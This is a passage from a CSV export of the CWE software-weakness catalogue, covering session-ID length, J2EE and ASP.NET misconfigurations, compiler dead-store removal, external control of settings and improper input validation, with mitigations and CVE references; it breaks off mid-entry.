will estimate the number of bits of entropy in a session identifier to be half the total number of bits in the session identifier. For realistic identifier lengths this is possible, though perhaps optimistic.::\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:If an attacker can guess an authenticated user's session identifier, they can take over the user's session.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Session identifiers should be at least 128 bits long to prevent brute-force session guessing. A shorter session identifier leaves the application open to brute-force session guessing attacks.::PHASE:Implementation:DESCRIPTION:A lower bound on the number of valid session identifiers that are available to be guessed is the number of users that are active on a site at any given moment. However, any users that abandon their sessions without logging out will increase this number. (This is one of many good reasons to have a short inactive session timeout.) With a 64 bit session identifier, assume 32 bits of entropy. For a large web site, assume that the attacker can try 1,000 guesses per second and that there are 10,000 valid session identifiers at any given moment. Given these assumptions, the expected time for an attacker to successfully guess a valid session identifier is less than 4 minutes. Now assume a 128 bit session identifier that provides 64 bits of entropy. With a very large web site, an attacker might try 10,000 guesses per second with 100,000 valid session identifiers available to be guessed. Given these assumptions, the expected time for an attacker to successfully guess a valid session identifier is greater than 292 years.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:J2EE Misconfiguration: Insufficient Session-ID Length::\",::21::59::,\"\",\n7,\"J2EE Misconfiguration: Missing Custom Error Page\",Variant,Incomplete,\"The default error page of a web application should not display sensitive information about the product.\",\"A Web application must define a default error page for 4xx errors (e.g. 404), 5xx (e.g. 500) errors and catch java.lang.Throwable exceptions to prevent attackers from mining information from the application container's built-in error response. When an attacker explores a web site looking for vulnerabilities, the amount of information that the site provides is crucial to the eventual success or failure of any attempted attacks.\",::NATURE:ChildOf:CWE ID:756:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:A stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Handle exceptions appropriately in source code.::PHASE:Implementation System Configuration:DESCRIPTION:Always define appropriate error pages. The application configuration should specify a default error page in order to guarantee that the application will never leak error messages to an attacker. Handling standard HTTP error codes is useful and user-friendly in addition to being a good security practice, and a good configuration will also define a last-chance error handler that catches any exception that could possibly be thrown by the application.::PHASE:Implementation:DESCRIPTION:Do not attempt to process an error or attempt to mask it.::PHASE:Implementation:DESCRIPTION:Verify return values are correct and do not supply sensitive information about the system.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:J2EE Misconfiguration: Missing Error Handling::\",,\"\",\n8,\"J2EE Misconfiguration: Entity Bean Declared Remote\",Variant,Incomplete,\"When an application exposes a remote interface for an entity bean, it might also expose methods that get or set the bean's data. These methods could be leveraged to read sensitive information, or to change data in ways that violate the application's expectations, potentially leading to other vulnerabilities.\",\"\",::NATURE:ChildOf:CWE ID:668:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Application Data:IMPACT:Modify Application Data::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Declare Java beans local when possible. When a bean must be remotely accessible, make sure that sensitive information is not exposed, and ensure that the application logic performs appropriate validation of any data that might be modified by an attacker.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:J2EE Misconfiguration: Unsafe Bean Declaration::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::\",,\"::TYPE:Other:NOTE:Entity beans that expose a remote interface become part of an application's attack surface. For performance reasons, an application should rarely use remote entity beans, so there is a good chance that a remote entity bean declaration is an error.::\",\n9,\"J2EE Misconfiguration: Weak Access Permissions for EJB Methods\",Variant,Draft,\"If elevated access rights are assigned to EJB methods, then an attacker can take advantage of the permissions to exploit the product.\",\"If the EJB deployment descriptor contains one or more method permissions that grant access to the special ANYONE role, it indicates that access control for the application has not been fully thought through or that the application is structured in such a way that reasonable access control restrictions are impossible.\",::NATURE:ChildOf:CWE ID:266:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Other::\",\"\",\"::PHASE:Architecture and Design System Configuration:DESCRIPTION:Follow the principle of least privilege when assigning access rights to EJB methods. Permission to invoke EJB methods should not be granted to the ANYONE role.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:J2EE Misconfiguration: Weak Access Permissions::\",,\"\",\n11,\"ASP.NET Misconfiguration: Creating Debug Binary\",Variant,Draft,\"Debugging messages help attackers learn about the system and plan a form of attack.\",\"ASP .NET applications can be configured to produce debug binaries. These binaries give detailed debugging messages and should not be used in production environments. Debug binaries are meant to be used in a development or testing environment and can pose a security risk if they are deployed to production.\",::NATURE:ChildOf:CWE ID:489:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:ASP.NET:LANGUAGE PREVALENCE:Undetermined::,\"::The debug attribute of the <compilation> tag defines whether compiled binaries should include debugging information. The use of debug binaries causes an application to provide as much information about itself as possible to the user.::\",\"\",\"::PHASE:Implementation::PHASE:Build and Compilation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:Attackers can leverage the additional information they gain from debugging output to mount attacks targeted on the framework, database, or other resources used by the application.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:System Configuration:DESCRIPTION:Avoid releasing debug binaries into the production environment. Change the debug mode to false when the application is deployed into production.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:ASP.NET Misconfiguration: Creating Debug Binary::\",,\"\",\n12,\"ASP.NET Misconfiguration: Missing Custom Error Page\",Variant,Draft,\"An ASP .NET application must enable custom error pages in order to prevent attackers from mining information from the framework's built-in responses.\",\"\",::NATURE:ChildOf:CWE ID:756:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:ASP.NET:LANGUAGE PREVALENCE:Undetermined::,\"::The mode attribute of the <customErrors> tag defines whether custom or default error pages are used.::\",\"\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:Default error pages gives detailed information about the error that occurred, and should not be used in production environments. Attackers can leverage the additional information provided by a default error page to mount attacks targeted on the framework, database, or other resources used by the application.::\",\"\",\"::PHASE:System Configuration:DESCRIPTION:Handle exceptions appropriately in source code. ASP .NET applications should be configured to use custom error pages instead of the framework default page.::PHASE:Architecture and Design:DESCRIPTION:Do not attempt to process an error or attempt to mask it.::PHASE:Implementation:DESCRIPTION:Verify return values are correct and do not supply sensitive information about the system.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:ASP.NET Misconfiguration: Missing Custom Error Handling::\",,\"\",\n13,\"ASP.NET Misconfiguration: Password in Configuration File\",Variant,Draft,\"Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource making them an easy target for attackers.\",\"\",::NATURE:ChildOf:CWE ID:260:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Credentials stored in configuration files should be encrypted, Use standard APIs and industry accepted algorithms to encrypt the credentials stored in configuration files.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:ASP.NET Misconfiguration: Password in Configuration File::\",,\"\",\n14,\"Compiler Removal of Code to Clear Buffers\",Variant,Draft,\"Sensitive memory is cleared according to the source code, but compiler optimizations leave the memory untouched when it is not read from again, aka dead store removal.\",\"This compiler optimization error occurs when: Secret data are stored in memory. The secret data are scrubbed from memory by overwriting its contents. The source code is compiled using an optimizing compiler, which identifies and removes the function that overwrites the contents as a dead store because the memory is not used subsequently.\",::NATURE:ChildOf:CWE ID:733:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::PHASE:Build and Compilation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Access Control:IMPACT:Read Memory:IMPACT:Bypass Protection Mechanism:NOTE:This weakness will allow data that has not been cleared from memory to be read. If this data contains sensitive password information, then an attacker can read the password and use the information to bypass protection mechanisms.::\",\"::METHOD:Black Box:DESCRIPTION:This specific weakness is impossible to detect using black box methods. While an analyst could examine memory to see that it has not been scrubbed, an analysis of the executable would not be successful. This is because the compiler has already removed the relevant code. Only the source code shows whether the programmer intended to clear the memory or not, so this weakness is indistinguishable from others.::METHOD:White Box:DESCRIPTION:This weakness is only detectable using white box methods (see black box detection factor). Careful analysis is required to determine if the code is likely to be removed by the compiler.::\",\"::PHASE:Implementation:DESCRIPTION:Store the sensitive data in a volatile memory location if available.::PHASE:Build and Compilation:DESCRIPTION:If possible, configure your compiler so that it does not remove dead stores.::PHASE:Architecture and Design:DESCRIPTION:Where possible, encrypt sensitive data that are used by a software system.::\",\"\",,::Memory::,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Insecure Compiler Optimization::TAXONOMY NAME:PLOVER:ENTRY NAME:Sensitive memory uncleared by compiler optimization::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A8:ENTRY NAME:Insecure Storage:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MSC06-C:ENTRY NAME:Be aware of compiler optimization when dealing with sensitive data::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::\",,\"\",\n15,\"External Control of System or Configuration Setting\",Base,Incomplete,\"One or more system settings or configuration elements can be externally controlled by a user.\",\"Allowing external control of system settings can disrupt service or cause an application to behave in unexpected, and potentially malicious ways.\",::NATURE:ChildOf:CWE ID:642:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:610:VIEW ID:1000::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"\",::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:Setting manipulation vulnerabilities occur when an attacker can control values that govern the behavior of the system, manage specific resources, or in some way affect the functionality of the application.::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::PHASE:Implementation Architecture and Design:DESCRIPTION:Because setting manipulation covers a diverse set of functions, any attempt at illustrating it will inevitably be incomplete. Rather than searching for a tight-knit relationship between the functions addressed in the setting manipulation category, take a step back and consider the sorts of system values that an attacker should not be allowed to control.::PHASE:Implementation Architecture and Design:DESCRIPTION:In general, do not allow user-provided or otherwise untrusted data to control sensitive values. The leverage that an attacker gains by controlling these values is not always immediately obvious, but do not underestimate the creativity of the attacker.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Setting Manipulation::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP25:ENTRY NAME:Tainted input to variable::\",::13::146::176::203::270::271::579::69::76::77::,\"\",\n20,\"Improper Input Validation\",Class,Stable,\"The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.\",\"Input validation is a frequently-used technique for checking potentially dangerous inputs in order to ensure that the inputs are safe for processing within the code, or when communicating with other components. When software does not validate input properly, an attacker is able to craft the input in a form that is not expected by the rest of the application. This will lead to parts of the system receiving unintended input, which may result in altered control flow, arbitrary control of a resource, or arbitrary code execution. Input validation is not the only technique for processing input, however. Other techniques attempt to transform potentially-dangerous input into something safe, such as filtering (CWE-790) - which attempts to remove dangerous inputs - or encoding/escaping (CWE-116), which attempts to ensure that the input is not misinterpreted when it is included in output to another component. Other techniques exist as well (see CWE-138 for more examples.) Input validation can be applied to: raw data - strings, numbers, parameters, file contents, etc. metadata - information about the raw data, such as headers or size Data can be simple or structured. Structured data can be composed of many nested layers, composed of combinations of metadata and raw data, with other simple or structured data. Many properties of raw data or metadata may need to be validated upon entry into the code, such as: specified quantities such as size, length, frequency, price, rate, number of operations, time, etc. implied or derived quantities, such as the actual size of a file instead of a specified size indexes, offsets, or positions into more complex data structures symbolic keys or other elements into hash tables, associative arrays, etc. well-formedness, i.e. syntactic correctness - compliance with expected syntax lexical token correctness - compliance with rules for what is treated as a token specified or derived type - the actual type of the input (or what the input appears to be) consistency - between individual data elements, between raw data and metadata, between references, etc. conformance to domain-specific rules, e.g. business logic equivalence - ensuring that equivalent inputs are treated the same authenticity, ownership, or other attestations about the input, e.g. a cryptographic signature to prove the source of the data Implied or derived properties of data must often be calculated or inferred by the code itself. Errors in deriving properties may be considered a contributing factor to improper input validation. Note that input validation has very different meanings to different people, or within different classification schemes. Caution must be used when referencing this CWE entry or mapping to it. For example, some weaknesses might involve inadvertently giving control to an attacker over an input when they should not be able to provide an input at all, but sometimes this is referred to as input validation. Finally, it is important to emphasize that the distinctions between input validation and output escaping are often blurred, and developers must be careful to understand the difference, including how input validation is not always sufficient to prevent vulnerabilities, especially when less stringent data types must be supported, such as free-form text. Consider a SQL injection scenario in which a person's last name is inserted into a query. The name O'Reilly would likely pass the validation step since it is a common last name in the English language. However, this valid name cannot be directly inserted into the database because it contains the ' apostrophe character, which would need to be escaped or otherwise transformed. In this case, removing the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded.\",::NATURE:ChildOf:CWE ID:707:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:345:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:22:VIEW ID:1000::NATURE:CanPrecede:CWE ID:41:VIEW ID:1000::NATURE:CanPrecede:CWE ID:74:VIEW ID:1000::NATURE:CanPrecede:CWE ID:119:VIEW ID:1000::NATURE:CanPrecede:CWE ID:770:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Often::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic. If a programmer believes that an attacker cannot modify certain inputs, then the programmer might not perform any input validation at all. For example, in web applications, many programmers believe that cookies and hidden form fields can not be modified from a web browser (CWE-472), although they can be altered using a proxy or a custom program. In a client-server architecture, the programmer might assume that client-side security checks cannot be bypassed, even when a custom client could be written that skips those checks (CWE-602).::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Memory):NOTE:An attacker could provide unexpected values and cause a program crash or excessive consumption of resources, such as memory and CPU.::SCOPE:Confidentiality:IMPACT:Read Memory:IMPACT:Read Files or Directories:NOTE:An attacker could read confidential data if they are able to control resource references.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Modify Memory:IMPACT:Execute Unauthorized Code or Commands:NOTE:An attacker could use malicious input to modify data or possibly alter control flow in unexpected ways, including arbitrary command execution.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Some instances of improper input validation can be detected using automated static analysis. A static analysis tool might allow the user to specify which application-specific methods or functions perform input validation; the tool might also have built-in knowledge of validation frameworks such as Struts. The tool may then suppress or de-prioritize any associated warnings. This allows the analyst to focus on areas of the software in which input validation does not appear to be present. Except in the cases described in the previous paragraph, automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.::METHOD:Manual Static Analysis:DESCRIPTION:When custom input validation is required, such as when enforcing business rules, manual analysis is necessary to ensure that the validation is properly implemented.::METHOD:Fuzzing:DESCRIPTION:Fuzzing techniques can be useful for detecting input validation errors. When unexpected inputs are provided to the software, the software should not crash or otherwise become unstable, and it should generate application-controlled error messages. If exceptions or interpreter-generated error messages occur, this indicates that the input was not detected and handled within the application logic itself.::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Fuzz Tester Framework-based Fuzzer Cost effective for partial coverage: Host Application Interface Scanner Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.) Formal Methods / Correct-By-Construction Cost effective for partial coverage: Attack Modeling:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:STRATEGY:Attack Surface Reduction:DESCRIPTION:Consider using language-theoretic security (LangSec) techniques that characterize inputs using a formal language and build recognizers for that language. This effectively requires parsing to be a distinct layer that effectively enforces a boundary between raw input and internal data representations, instead of allowing parser code to be scattered throughout the program, where it could be subject to errors or inconsistencies that create weaknesses. [REF-1109] [REF-1110] [REF-1111]::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use an input validation framework such as Struts or the OWASP ESAPI Validation API. Note that using a framework does not automatically address all input validation problems; be mindful of weaknesses that could arise from misusing the framework itself (CWE-1173).::PHASE:Architecture and Design Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.:EFFECTIVENESS:High::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server. Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.::PHASE:Implementation:DESCRIPTION:When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.::PHASE:Implementation:DESCRIPTION:Be especially careful to validate all input when invoking code that crosses language boundaries, such as from an interpreted language to native code. This could create an unexpected interaction between the language boundaries. Ensure that you are not violating any of the expectations of the language with which you are interfacing. For example, even though Java may not be susceptible to buffer overflows, providing a large argument in a call to native code might trigger an overflow.::PHASE:Implementation:DESCRIPTION:Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.::PHASE:Implementation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control. Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.::PHASE:Implementation:DESCRIPTION:When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.::\",\"::REFERENCE:CVE-2024-37032:DESCRIPTION:Large language model (LLM) management tool does not validate the format of a digest value (CWE-1287) from a private, untrusted model registry, enabling relative path traversal (CWE-23), a.k.a. Probllama:LINK:https://www.cve.org/CVERecord?id=CVE-2024-37032::REFERENCE:CVE-2022-45918:DESCRIPTION:Chain: a learning management tool debugger uses external input to locate previous session logs (CWE-73) and does not properly validate the given path (CWE-20), allowing for filesystem path traversal using ../ sequences (CWE-24):LINK:https://www.cve.org/CVERecord?id=CVE-2022-45918::REFERENCE:CVE-2021-30860:DESCRIPTION:Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-30860::REFERENCE:CVE-2021-30663:DESCRIPTION:Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-30663::REFERENCE:CVE-2021-22205:DESCRIPTION:Chain: backslash followed by a newline can bypass a validation step (CWE-20), leading to eval injection (CWE-95), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-22205::REFERENCE:CVE-2021-21220:DESCRIPTION:Chain: insufficient input validation (CWE-20) in browser allows heap corruption (CWE-787), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-21220::REFERENCE:CVE-2020-9054:DESCRIPTION:Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-9054::REFERENCE:CVE-2020-3452:DESCRIPTION:Chain: security product has improper input validation (CWE-20) leading to directory traversal (CWE-22), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-3452::REFERENCE:CVE-2020-3161:DESCRIPTION:Improper input validation of HTTP requests in IP phone, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-3161::REFERENCE:CVE-2020-3580:DESCRIPTION:Chain: improper input validation (CWE-20) in firewall product leads to XSS (CWE-79), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-3580::REFERENCE:CVE-2021-37147:DESCRIPTION:Chain: caching proxy server has improper input validation (CWE-20) of headers, allowing HTTP response smuggling (CWE-444) using an LF line ending:LINK:https://www.cve.org/CVERecord?id=CVE-2021-37147::REFERENCE:CVE-2008-5305:DESCRIPTION:Eval injection in Perl program using an ID that should only contain hyphens and numbers.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5305::REFERENCE:CVE-2008-2223:DESCRIPTION:SQL injection through an ID that was supposed to be numeric.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2223::REFERENCE:CVE-2008-3477:DESCRIPTION:lack of input validation in spreadsheet program leads to buffer overflows, integer overflows, array index errors, and memory corruption.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3477::REFERENCE:CVE-2008-3843:DESCRIPTION:insufficient validation enables XSS:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3843::REFERENCE:CVE-2008-3174:DESCRIPTION:driver in security product allows code execution due to insufficient validation:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3174::REFERENCE:CVE-2007-3409:DESCRIPTION:infinite loop from DNS packet with a label that points to itself:LINK:https://www.cve.org/CVERecord?id=CVE-2007-3409::REFERENCE:CVE-2006-6870:DESCRIPTION:infinite loop from DNS packet with a label that points to itself:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6870::REFERENCE:CVE-2008-1303:DESCRIPTION:missing parameter leads to crash:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1303::REFERENCE:CVE-2007-5893:DESCRIPTION:HTTP request with missing protocol version number leads to crash:LINK:https://www.cve.org/CVERecord?id=CVE-2007-5893::REFERENCE:CVE-2006-6658:DESCRIPTION:request with missing parameters leads to information exposure:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6658::REFERENCE:CVE-2008-4114:DESCRIPTION:system crash with offset value that is inconsistent with packet size:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4114::REFERENCE:CVE-2006-3790:DESCRIPTION:size field that is inconsistent with packet size leads to buffer over-read:LINK:https://www.cve.org/CVERecord?id=CVE-2006-3790::REFERENCE:CVE-2008-2309:DESCRIPTION:product uses a denylist to identify potentially dangerous content, allowing attacker to bypass a warning:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2309::REFERENCE:CVE-2008-3494:DESCRIPTION:security bypass via an extra header:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3494::REFERENCE:CVE-2008-3571:DESCRIPTION:empty packet triggers reboot:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3571::REFERENCE:CVE-2006-5525:DESCRIPTION:incomplete denylist allows SQL injection:LINK:https://www.cve.org/CVERecord?id=CVE-2006-5525::REFERENCE:CVE-2008-1284:DESCRIPTION:NUL byte in theme name causes directory traversal impact to be worse:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1284::REFERENCE:CVE-2008-0600:DESCRIPTION:kernel does not validate an incoming pointer before dereferencing it:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0600::REFERENCE:CVE-2008-1738:DESCRIPTION:anti-virus product has insufficient input validation of hooked SSDT functions, allowing code execution:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1738::REFERENCE:CVE-2008-1737:DESCRIPTION:anti-virus product allows DoS via zero-length field:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1737::REFERENCE:CVE-2008-3464:DESCRIPTION:driver does not validate input from userland to the kernel:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3464::REFERENCE:CVE-2008-2252:DESCRIPTION:kernel does not validate parameters sent in from userland, allowing code execution:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2252::REFERENCE:CVE-2008-2374:DESCRIPTION:lack of validation of string length fields allows memory consumption or buffer over-read:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2374::REFERENCE:CVE-2008-1440:DESCRIPTION:lack of validation of length field leads to infinite loop:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1440::REFERENCE:CVE-2008-1625:DESCRIPTION:lack of validation of input to an IOCTL allows code execution:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1625::REFERENCE:CVE-2008-3177:DESCRIPTION:zero-length attachment causes crash:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3177::REFERENCE:CVE-2007-2442:DESCRIPTION:zero-length input causes free of uninitialized pointer:LINK:https://www.cve.org/CVERecord?id=CVE-2007-2442::REFERENCE:CVE-2008-5563:DESCRIPTION:crash via a malformed frame structure:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5563::REFERENCE:CVE-2008-5285:DESCRIPTION:infinite loop from a long SMTP 